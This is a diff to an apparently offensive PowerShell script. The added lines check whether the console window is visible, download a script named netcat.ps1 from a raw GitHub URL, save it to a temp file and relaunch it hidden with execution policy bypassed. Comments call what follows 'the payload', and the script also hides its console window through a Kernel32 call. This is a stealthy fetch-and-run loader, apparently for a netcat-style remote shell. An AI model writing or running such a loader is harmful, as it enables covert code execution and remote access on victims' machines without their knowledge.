@@ -1,4 +1,16 @@
-# Hide PowerShell window completely
+# Check if running with -WindowStyle Hidden parameter
+if ((Get-Process -Id $PID).MainWindowHandle -ne 0) {
+    # Window is visible, relaunch hidden
+    $scriptContent = IWR https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/netcat.ps1 -UseBasicParsing
+    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+    $scriptContent.Content | Out-File -FilePath $tempScript -Encoding ASCII
+    
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+    exit
+}
+
+# If we're here, we're already hidden - proceed with the payload
+# Hide PowerShell window completely (belt and suspenders approach)
 $windowCode = @"
 [DllImport("Kernel32.dll")]
 public static extern IntPtr GetConsoleWindow();
